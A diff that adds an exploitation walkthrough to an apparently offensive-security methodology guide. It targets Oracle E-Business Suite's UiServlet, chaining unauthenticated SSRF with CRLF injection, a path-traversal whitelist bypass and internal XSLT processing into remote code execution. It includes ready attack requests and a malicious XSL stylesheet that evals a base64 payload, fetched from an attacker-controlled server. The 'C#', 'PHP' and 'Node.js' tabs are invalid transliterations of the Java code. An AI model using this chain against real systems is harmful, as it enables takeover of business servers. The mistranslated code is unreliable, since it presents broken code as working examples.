@@ -1596,6 +1596,834 @@ function deployCCPackage(servicePack) {
 
 ***
 
-####
+#### Unauthenticated SSRF with CRLF Injection and Internal XSLT Processing Leading to Remote Code Execution
+
+{% stepper %}
+{% step %}
+Map the entire target system or product using the Burp Suite tool
+{% endstep %}
+
+{% step %}
+Draw the entry points and endpoints in XMind
+{% endstep %}
+
+{% step %}
+Decompile the application based on the programming language used
+{% endstep %}
+
+{% step %}
+Find the application configuration or routing files (such as `web.xml`, `routes.conf`, or their equivalents) and extract the endpoints that are mapped to a handler, servlet, or controller
+
+```xml
+/configurator/UiServlet
+
+<servlet> 
+  <servlet-name>czUiServlet</servlet-name> 
+  <servlet-class>oracle.apps.cz.servlet.UiServlet</servlet-class> 
+  <load-on-startup>1</load-on-startup> 
+</servlet>
+```
+{% endstep %}
+
+{% step %}
+Select endpoints that accept user input and whose parameter names include values related to URL or redirect (such as `target`, `callback`, `return_url`, and so on)
+{% endstep %}
+
+{% step %}
+Open the handler code for that endpoint and check whether the input is passed directly or indirectly into a parser (XML parser, JSON parser, or string parser)
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+if (paramHttpServletRequest.getParameter("killAndRestartServer") != null) {
+  paramHttpServletResponse.sendError(400);
+  closeSession(httpSession);
+} 
+else if (paramHttpServletRequest.getParameter("generateOutput") != null) {
+  generateOutput(paramHttpServletRequest, paramHttpServletResponse);
+} 
+else if (paramHttpServletRequest.getParameter("getUiType") != null) {
+
+  string str = paramHttpServletRequest.getParameter("redirectFromJsp"); // [1]
+
+  XMLDocument xMLDocument = XmlUtil.parseXmlString(
+      paramHttpServletRequest.getParameter("getUiType")
+  ); // [0]
+
+  if (str == null || "false".equalsIgnoreCase(str)) {
+    redirectToCZInitialize(paramHttpServletRequest, paramHttpServletResponse, str2);
+    return;
+  } 
+
+  createNew(xMLDocument, httpSession, paramHttpServletRequest, paramHttpServletResponse); // [2]
+}
+
+string str1 = CZUiUtilities.resubXMLAndURLChars(
+    XmlUtil.getReturnUrlParameter(paramXMLDocument)
+);
+
+clientAdapter.setReturnUrl(str1);
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+if (paramHttpServletRequest.getParameter("killAndRestartServer") != null) {
+  paramHttpServletResponse.sendError(400);
+  closeSession(httpSession);
+} 
+else if (paramHttpServletRequest.getParameter("generateOutput") != null) {
+  generateOutput(paramHttpServletRequest, paramHttpServletResponse);
+} 
+else if (paramHttpServletRequest.getParameter("getUiType") != null) {
+
+  String str = paramHttpServletRequest.getParameter("redirectFromJsp"); // [1]
+
+  XMLDocument xMLDocument = XmlUtil.parseXmlString(
+      paramHttpServletRequest.getParameter("getUiType")
+  ); // [0]
+
+  if (str == null || "false".equalsIgnoreCase(str)) {
+    redirectToCZInitialize(paramHttpServletRequest, paramHttpServletResponse, str2);
+    return;
+  } 
+
+  createNew(xMLDocument, httpSession, paramHttpServletRequest, paramHttpServletResponse); // [2]
+}
+
+String str1 = CZUiUtilities.resubXMLAndURLChars(
+    XmlUtil.getReturnUrlParameter(paramXMLDocument)
+);
+
+clientAdapter.setReturnUrl(str1);
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+if ($paramHttpServletRequest->getParameter("killAndRestartServer") != null) {
+  $paramHttpServletResponse->sendError(400);
+  closeSession($httpSession);
+} 
+else if ($paramHttpServletRequest->getParameter("generateOutput") != null) {
+  generateOutput($paramHttpServletRequest, $paramHttpServletResponse);
+} 
+else if ($paramHttpServletRequest->getParameter("getUiType") != null) {
+
+  $str = $paramHttpServletRequest->getParameter("redirectFromJsp"); // [1]
+
+  $xMLDocument = XmlUtil::parseXmlString(
+      $paramHttpServletRequest->getParameter("getUiType")
+  ); // [0]
+
+  if ($str == null || "false".equalsIgnoreCase($str)) {
+    redirectToCZInitialize($paramHttpServletRequest, $paramHttpServletResponse, $str2);
+    return;
+  } 
+
+  createNew($xMLDocument, $httpSession, $paramHttpServletRequest, $paramHttpServletResponse); // [2]
+}
+
+$str1 = CZUiUtilities::resubXMLAndURLChars(
+    XmlUtil::getReturnUrlParameter($paramXMLDocument)
+);
+
+$clientAdapter->setReturnUrl($str1);
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+if (paramHttpServletRequest.getParameter("killAndRestartServer") != null) {
+  paramHttpServletResponse.sendError(400);
+  closeSession(httpSession);
+} 
+else if (paramHttpServletRequest.getParameter("generateOutput") != null) {
+  generateOutput(paramHttpServletRequest, paramHttpServletResponse);
+} 
+else if (paramHttpServletRequest.getParameter("getUiType") != null) {
+
+  let str = paramHttpServletRequest.getParameter("redirectFromJsp"); // [1]
+
+  let xMLDocument = XmlUtil.parseXmlString(
+      paramHttpServletRequest.getParameter("getUiType")
+  ); // [0]
+
+  if (str == null || "false".equalsIgnoreCase(str)) {
+    redirectToCZInitialize(paramHttpServletRequest, paramHttpServletResponse, str2);
+    return;
+  } 
+
+  createNew(xMLDocument, httpSession, paramHttpServletRequest, paramHttpServletResponse); // [2]
+}
+
+let str1 = CZUiUtilities.resubXMLAndURLChars(
+    XmlUtil.getReturnUrlParameter(paramXMLDocument)
+);
+
+clientAdapter.setReturnUrl(str1);
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+In the input payload, check whether there is a data structure (such as XML or JSON) from which a specific field is extracted (such as `return_url`)
+{% endstep %}
+
+{% step %}
+Follow the usage path of this extracted value to see to which object it is passed (client, adapter, or service layer)
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+(XmlDocument\.LoadXml|XDocument\.Parse)|(HttpClient|WebRequest\.Create)|(GetAsync|DownloadString)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+(XmlUtil\.parseXmlString)|(getParameter\s*\("getUiType"\))|(new\s+URL\s*\(|HttpURLConnection|CZURLConnection|postXmlMessage)
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+(simplexml_load_string)|(DOMDocument)|(curl_exec|file_get_contents\s*\()
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+(xml2js)|(axios\.get|fetch\s*\(|http\.get|https\.get)
+```
+
+
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+XmlDocument\.LoadXml|XDocument\.Parse|HttpClient|WebRequest\.Create|GetAsync|DownloadString
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+XmlUtil\.parseXmlString|getParameter\s*\("getUiType"\)|new\s+URL\s*\(|HttpURLConnection|CZURLConnection|postXmlMessage
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+simplexml_load_string|DOMDocument|curl_exec|file_get_contents\s*\(
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+xml2js|axios\.get|fetch\s*\(|http\.get|https\.get
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Patterns**
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+protected void postXmlMessage(String paramString1, String paramString2) throws ServletException {
+  try {
+
+    URL uRL = getUrl(paramString1); // Create URL
+
+    if (uRL != null)
+      paramString1 = uRL.toExternalForm();
+
+    CZURLConnection cZURLConnection = new CZURLConnection(paramString1);
+
+    String[] arrayOfString1 = { "XMLmsg" };
+    String[] arrayOfString2 = { paramString2 };
+
+    cZURLConnection.connect(1, arrayOfString1, arrayOfString2);
+
+    cZURLConnection.close();
+
+  } catch (Exception exception) {
+    throw new ServletException("Could not post XML message...");
+  }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+protected void postXmlMessage(String paramString1, String paramString2) throws ServletException {
+  try {
+
+    URL uRL = getUrl(paramString1); // Create URL
+
+    if (uRL != null)
+      paramString1 = uRL.toExternalForm();
+
+    CZURLConnection cZURLConnection = new CZURLConnection(paramString1);
+
+    String[] arrayOfString1 = { "XMLmsg" };
+    String[] arrayOfString2 = { paramString2 };
+
+    cZURLConnection.connect(1, arrayOfString1, arrayOfString2);
+
+    cZURLConnection.close();
+
+  } catch (Exception exception) {
+    throw new ServletException("Could not post XML message...");
+  }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+protected function postXmlMessage($paramString1, $paramString2)
+{
+  try {
+
+    $uRL = $this->getUrl($paramString1); // Create URL
+
+    if ($uRL != null)
+      $paramString1 = $uRL->toExternalForm();
+
+    $cZURLConnection = new CZURLConnection($paramString1);
+
+    $arrayOfString1 = ["XMLmsg"];
+    $arrayOfString2 = [$paramString2];
+
+    $cZURLConnection->connect(1, $arrayOfString1, $arrayOfString2);
+
+    $cZURLConnection->close();
+
+  } catch (Exception $exception) {
+    throw new ServletException("Could not post XML message...");
+  }
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+protected postXmlMessage(paramString1, paramString2) throws ServletException {
+  try {
+
+    let uRL = getUrl(paramString1); // Create URL
+
+    if (uRL != null)
+      paramString1 = uRL.toExternalForm();
+
+    let cZURLConnection = new CZURLConnection(paramString1);
+
+    let arrayOfString1 = [ "XMLmsg" ];
+    let arrayOfString2 = [ paramString2 ];
+
+    cZURLConnection.connect(1, arrayOfString1, arrayOfString2);
+
+    cZURLConnection.close();
+
+  } catch (exception) {
+    throw new ServletException("Could not post XML message...");
+  }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+In the next layer, check whether this value is ultimately used to construct a URL or network connection (such as creating an HTTP request or redirect)
+{% endstep %}
+
+{% step %}
+Look for network sinks that convert user input into an HTTP request (such as `openConnection`, `HttpClient.request`, or `sendRequest`)
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+HttpURLConnection httpURLConnection =
+    (HttpURLConnection)paramURL.openConnection();
+
+httpURLConnection.setDoOutput(true);
+httpURLConnection.setRequestMethod("POST");
+
+this.m_connectionOutputStream = httpURLConnection.getOutputStream();
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+HttpURLConnection httpURLConnection =
+    (HttpURLConnection)paramURL.openConnection();
+
+httpURLConnection.setDoOutput(true);
+httpURLConnection.setRequestMethod("POST");
+
+this.m_connectionOutputStream = httpURLConnection.getOutputStream();
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+$httpURLConnection = (HttpURLConnection)$paramURL->openConnection();
+
+$httpURLConnection->setDoOutput(true);
+$httpURLConnection->setRequestMethod("POST");
+
+$this->m_connectionOutputStream = $httpURLConnection->getOutputStream();
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+let httpURLConnection =
+    paramURL.openConnection();
+
+httpURLConnection.setDoOutput(true);
+httpURLConnection.setRequestMethod("POST");
+
+this.m_connectionOutputStream = httpURLConnection.getOutputStream();
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+If user input enters the URL or host without restriction, SSRF exists
+{% endstep %}
+
+{% step %}
+Then place a CRLF payload in the target request and send it to your local server to confirm CRLF injection in the SSRF
+
+Request :
+
+```http
+POST /OA_HTML/configurator/UiServlet HTTP/1.1
+Host: {{Hostname}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 524
+
+redirectFromJsp=1&getUiType=<@urlencode><?xml version="1.0" encoding="UTF-8"?>
+<initialize>
+    <param name="init_was_saved">test</param>
+    <param name="return_url"><http://attacker-oob-server>&#47;HeaderInjectionTest&#32;HTTP&#47;1&#46;1&#13;&#10;InjectedHeader&#58;Injected&#13;&#10;&#32;&#13;&#10;&#13;&#13;&#10;&#13;&#13;&#10;&#13;&#13;&#10;POST&#32;&#47;</param>
+ 
+    <param name="ui_def_id">0</param>
+    <param name="config_effective_usage_id">0</param>
+    <param name="ui_type">Applet</param>
+</initialize></@urlencode>
+```
+
+Response :
+
+```bash
+[root@oob-server]# python3 server.py 80
+
+[*] Serving raw HTTP on port 80
+
+==================================================
+
+DUMPING RAW HTTP REQUEST from oracle-business-ip:19080
+
+POST /HeaderInjectionTest HTTP/1.1
+--- HEADERS ---
+InjectedHeader: Injected
+```
+{% endstep %}
+
+{% step %}
+Identify the internal services of the application and check what types of addresses are listening inside the application (for example, different ports or specific IP addresses)
+
+```bash
+# netstat -lnt
+
+tcp6       0      0 172.31.28.161:7201      :::*                    LISTEN
+```
+{% endstep %}
+
+{% step %}
+Review operating system configuration files such as `/etc/hosts` to determine which domain is mapped to that IP address
+
+```bash
+# cat /etc/hosts
+
+172.31.28.161   apps.example.com        apps
+```
+{% endstep %}
+
+{% step %}
+Identify internal paths and endpoints of the application, especially JSP files, Servlets, APIs, and administrative pages, and send a request to them
+
+```bash
+# curl -s http://apps.example.com:7201/OA_HTML/ieshostedsurvey.jsp
+
+Requested resource or page is not allowed in this site
+```
+{% endstep %}
+
+{% step %}
+If access is denied, try to bypass it using path traversal, and if successful, the whitelist bypass has been successfully achieved
+
+```bash
+# curl -s --path-as-is http://apps.example.com:7201/OA_HTML/help/../ieshostedsurvey.jsp
+
+<!-- $Header: ieshostedsurvey.jsp 120.0 2005/06/03 07:43:36 appldev noship $ -->
+<!-- +======================================================================+ -->
+<!-- |    Copyright (c) 2005, 2017 Oracle and/or its affiliates.           | -->
+<!-- |                         All rights reserved.                         | -->
+<!-- |                           Version 12.0.0                             | -->
+<!-- +======================================================================+ -->
+
+<html>
+<head>
+```
+{% endstep %}
+
+{% step %}
+Then, in these JSP files, look for the use of transformation and processing engines such as XSLT, `XSLProcessor`, `TransformerFactory`, `SAXTransformerFactory`, `XSLStylesheet`, and similar APIs
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+(XslCompiledTransform)|(XmlUrlResolver)|(Load\s*\(\s*.*http)|(Transform\s*\()
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+(new\s+URL\s*\()|(XSLStylesheet\s*\()|(XSLProcessor\s*\()|(processXSL\s*\()|(urlbuf|toString\s*\(\))
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+(XSLTProcessor)|(load\s*\(\s*.*http)|(DOMDocument)|(loadXML)
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+(xslt-process|libxslt|fetch\s*\(|axios\.get|xml2js)
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+XslCompiledTransform|XmlUrlResolver|Load\s*\(\s*.*http|Transform\s*\(
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+new\s+URL\s*\(|XSLStylesheet\s*\(|XSLProcessor\s*\(|processXSL\s*\(|urlbuf|toString\s*\(
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+XSLTProcessor|load\s*\(\s*.*http|DOMDocument|loadXML
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+xslt-process|libxslt|fetch\s*\(|axios\.get|xml2js
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Patterns**
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+string xslURL = urlbuf.toString() + "ieshostedsurvey.xsl"; // [5]
+
+String desturl = ServletSessionManager.getURL("iessvymenubased.jsp");
+StringBuffer query = new StringBuffer("select s.survey_name || '--> ' || c.SURVEY_CYCLE_NAME || '--> ' || d.Deployment_name || '--> ' ||d.SURVEY_DEPLOYMENT_ID as survey_name,");
+
+query.append("\'").append(desturl).append("\'").append(" uri ,d.SURVEY_DEPLOYMENT_ID as deployment_id " +
+     " from  IES_SVY_SURVEYS_ALL s, " +
+             "       IES_SVY_CYCLES_ALL c, " +
+             "       IES_SVY_DEPLYMENTS_ALL d " +
+             " where " +
+             "      s.SURVEY_ID = c.SURVEY_ID " +
+             "      and c.SURVEY_CYCLE_ID = d.SURVEY_CYCLE_ID " +
+             "      and d.DEPLOYMENT_STATUS_CODE = 'ACTIVE' " +
+             "      and d.LIST_HEADER_ID is null " +
+             "      and sysdate between d.DEPLOY_DATE and d.RESPONSE_END_DATE ");
+
+Connection conn = null;
+OracleXMLQuery q = null;
+try{
+    conn = TransactionScope.getConnection();
+    q = new OracleXMLQuery(conn, query.toString());
+}catch(Exception ex){
+    out.println(ex.getMessage());
+    if(conn != null)
+        conn.close();
+}
+
+XMLDocument xmlDoc = (XMLDocument)q.getXMLDOM();
+
+//URL stylesheetURL = new URL("http://kpandey-lap1.us.oracle.com/html/ieshostedsurvey.xsl");
+URL stylesheetURL = new URL(xslURL.toString()); // [6]
+XSLStylesheet sheet = new XSLStylesheet(stylesheetURL, stylesheetURL); // [7]
+XSLProcessor xslt = new XSLProcessor(); // [8]
+
+ByteArrayOutputStream outBytes = new ByteArrayOutputStream();
+
+xslt.processXSL(
+    sheet,
+    xmlDoc,
+    new PrintWriter(
+        new BufferedWriter(
+            new OutputStreamWriter(outBytes)
+        )
+    )
+); // [9]
+
+String html = outBytes.toString();
+out.println(html);
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+String xslURL = urlbuf.toString() + "ieshostedsurvey.xsl"; // [5]
+
+String desturl = ServletSessionManager.getURL("iessvymenubased.jsp");
+StringBuffer query = new StringBuffer("select s.survey_name || '--> ' || c.SURVEY_CYCLE_NAME || '--> ' || d.Deployment_name || '--> ' ||d.SURVEY_DEPLOYMENT_ID as survey_name,");
+
+query.append("\'").append(desturl).append("\'").append(" uri ,d.SURVEY_DEPLOYMENT_ID as deployment_id " +
+     " from  IES_SVY_SURVEYS_ALL s, " +
+             "       IES_SVY_CYCLES_ALL c, " +
+             "       IES_SVY_DEPLYMENTS_ALL d " +
+             " where " +
+             "      s.SURVEY_ID = c.SURVEY_ID " +
+             "      and c.SURVEY_CYCLE_ID = d.SURVEY_CYCLE_ID " +
+             "      and d.DEPLOYMENT_STATUS_CODE = 'ACTIVE' " +
+             "      and d.LIST_HEADER_ID is null " +
+             "      and sysdate between d.DEPLOY_DATE and d.RESPONSE_END_DATE ");
+
+Connection conn = null;
+OracleXMLQuery q = null;
+try{
+    conn = TransactionScope.getConnection();
+    q = new OracleXMLQuery(conn, query.toString());
+}catch(Exception ex){
+    out.println(ex.getMessage());
+    if(conn != null)
+        conn.close();
+}
+
+XMLDocument xmlDoc = (XMLDocument)q.getXMLDOM();
+
+//URL stylesheetURL = new URL("http://kpandey-lap1.us.oracle.com/html/ieshostedsurvey.xsl");
+URL stylesheetURL = new URL(xslURL.toString()); // [6]
+XSLStylesheet sheet = new XSLStylesheet(stylesheetURL, stylesheetURL); // [7]
+XSLProcessor xslt = new XSLProcessor(); // [8]
+
+ByteArrayOutputStream outBytes = new ByteArrayOutputStream();
+
+xslt.processXSL(
+    sheet,
+    xmlDoc,
+    new PrintWriter(
+        new BufferedWriter(
+            new OutputStreamWriter(outBytes)
+        )
+    )
+); // [9]
+
+String html = outBytes.toString();
+out.println(html);
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+$xslURL = $urlbuf->toString() . "ieshostedsurvey.xsl"; // [5]
+
+$desturl = ServletSessionManager::getURL("iessvymenubased.jsp");
+$query = new StringBuffer("select s.survey_name || '--> ' || c.SURVEY_CYCLE_NAME || '--> ' || d.Deployment_name || '--> ' ||d.SURVEY_DEPLOYMENT_ID as survey_name,");
+
+$query->append("\'")->append($desturl)->append("\'")->append(" uri ,d.SURVEY_DEPLOYMENT_ID as deployment_id " .
+     " from  IES_SVY_SURVEYS_ALL s, " .
+             "       IES_SVY_CYCLES_ALL c, " .
+             "       IES_SVY_DEPLYMENTS_ALL d " .
+             " where " .
+             "      s.SURVEY_ID = c.SURVEY_ID " .
+             "      and c.SURVEY_CYCLE_ID = d.SURVEY_CYCLE_ID " .
+             "      and d.DEPLOYMENT_STATUS_CODE = 'ACTIVE' " .
+             "      and d.LIST_HEADER_ID is null " .
+             "      and sysdate between d.DEPLOY_DATE and d.RESPONSE_END_DATE ");
+
+$conn = null;
+$q = null;
+try{
+    $conn = TransactionScope::getConnection();
+    $q = new OracleXMLQuery($conn, $query->toString());
+}catch(Exception $ex){
+    out.println($ex->getMessage());
+    if($conn != null)
+        $conn->close();
+}
+
+$xmlDoc = (XMLDocument)$q->getXMLDOM();
+
+//URL stylesheetURL = new URL("http://kpandey-lap1.us.oracle.com/html/ieshostedsurvey.xsl");
+$stylesheetURL = new URL($xslURL->toString()); // [6]
+$sheet = new XSLStylesheet($stylesheetURL, $stylesheetURL); // [7]
+$xslt = new XSLProcessor(); // [8]
+
+$outBytes = new ByteArrayOutputStream();
+
+$xslt->processXSL(
+    $sheet,
+    $xmlDoc,
+    new PrintWriter(
+        new BufferedWriter(
+            new OutputStreamWriter($outBytes)
+        )
+    )
+); // [9]
+
+$html = $outBytes->toString();
+out.println($html);
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+let xslURL = urlbuf.toString() + "ieshostedsurvey.xsl"; // [5]
+
+let desturl = ServletSessionManager.getURL("iessvymenubased.jsp");
+let query = new StringBuffer("select s.survey_name || '--> ' || c.SURVEY_CYCLE_NAME || '--> ' || d.Deployment_name || '--> ' ||d.SURVEY_DEPLOYMENT_ID as survey_name,");
+
+query.append("\'").append(desturl).append("\'").append(" uri ,d.SURVEY_DEPLOYMENT_ID as deployment_id " +
+     " from  IES_SVY_SURVEYS_ALL s, " +
+             "       IES_SVY_CYCLES_ALL c, " +
+             "       IES_SVY_DEPLYMENTS_ALL d " +
+             " where " +
+             "      s.SURVEY_ID = c.SURVEY_ID " +
+             "      and c.SURVEY_CYCLE_ID = d.SURVEY_CYCLE_ID " +
+             "      and d.DEPLOYMENT_STATUS_CODE = 'ACTIVE' " +
+             "      and d.LIST_HEADER_ID is null " +
+             "      and sysdate between d.DEPLOY_DATE and d.RESPONSE_END_DATE ");
+
+let conn = null;
+let q = null;
+try{
+    conn = TransactionScope.getConnection();
+    q = new OracleXMLQuery(conn, query.toString());
+}catch(Exception ex){
+    out.println(ex.getMessage());
+    if(conn != null)
+        conn.close();
+}
+
+let xmlDoc = (XMLDocument)q.getXMLDOM();
+
+//URL stylesheetURL = new URL("http://kpandey-lap1.us.oracle.com/html/ieshostedsurvey.xsl");
+let stylesheetURL = new URL(xslURL.toString()); // [6]
+let sheet = new XSLStylesheet(stylesheetURL, stylesheetURL); // [7]
+let xslt = new XSLProcessor(); // [8]
+
+let outBytes = new ByteArrayOutputStream();
+
+xslt.processXSL(
+    sheet,
+    xmlDoc,
+    new PrintWriter(
+        new BufferedWriter(
+            new OutputStreamWriter(outBytes)
+        )
+    )
+); // [9]
+
+let html = outBytes.toString();
+out.println(html);
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Check whether this URL is built from user-controllable data such as the `Host` header, `GET/POST` parameters, cookies, custom headers, or session variables. Then create a malicious XSL file that uses available extension functions to execute code or commands, host the XSL file on an HTTP server under your control, craft a request that forces the application to download and process the XSL file from your server, and then confirm that the XSL file was downloaded and processed
+
+Request :
+
+```http
+POST /OA_HTML/configurator/UiServlet HTTP/1.1
+Host: not-actually-watchtowr.com-stop-emailing-us-about-iocs:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+CSRF-XHR: YES
+FETCH-CSRF-TOKEN: 1
+Cookie: JSESSIONID=_NG5Yg8cBERFjA5L23s9UUyzG7G8hSZpYkmc6YAEBjT71alQ2UH6!906988146; EBSDB=oSVgJCh0YacxUZCwOlLajtL2zo
+Content-Length: 847
+Content-Type: application/x-www-form-urlencoded
+
+redirectFromJsp=1&getUiType=<@urlencode><?xml version="1.0" encoding="UTF-8"?>
+<initialize>
+    <param name="init_was_saved">test</param>
+    <param name="return_url"><http://apps.example.com:7201><@html_entities>/OA_HTML/help/../ieshostedsurvey.jsp HTTP/1.2
+Host: attacker-oob-server
+User-Agent: anything
+Connection: keep-alive
+Cookie: JSESSIONID=_NG5Yg8cBERFjA5L23s9UUyzG7G8hSZpYkmc6YAEBjT71alQ2UH6!906988146; EBSDB=oSVgJCh0YacxUZCwOlLajtL2zo
+ 
+
+POST /</@html_entities></param>
+ 
+    <param name="ui_def_id">0</param>
+    <param name="config_effective_usage_id">0</param>
+    <param name="ui_type">Applet</param>
+</initialize></@urlencode>
+```
+
+XSL Content File :
+
+```xsl
+<xsl:stylesheet version="1.0"
+                    xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>"
+                    xmlns:b64="<http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder>"
+                    xmlns:jsm="<http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager>"
+                    xmlns:eng="<http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine>"
+                    xmlns:str="<http://www.oracle.com/XSL/Transform/java/java.lang.String>">
+        <xsl:template match="/">
+            <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'[base64_encoded_payload]')"/>
+            <xsl:variable name="js" select="str:new($bs)"/>
+            <xsl:variable name="m" select="jsm:new()"/>
+            <xsl:variable name="e" select="jsm:getEngineByName($m, 'js')"/>
+            <xsl:variable name="code" select="eng:eval($e, $js)"/>
+            <xsl:value-of select="$code"/>
+        </xsl:template>
+    </xsl:stylesheet>
+```
+{% endstep %}
+{% endstepper %}
+
+***
 
 ## Cheat Sheet
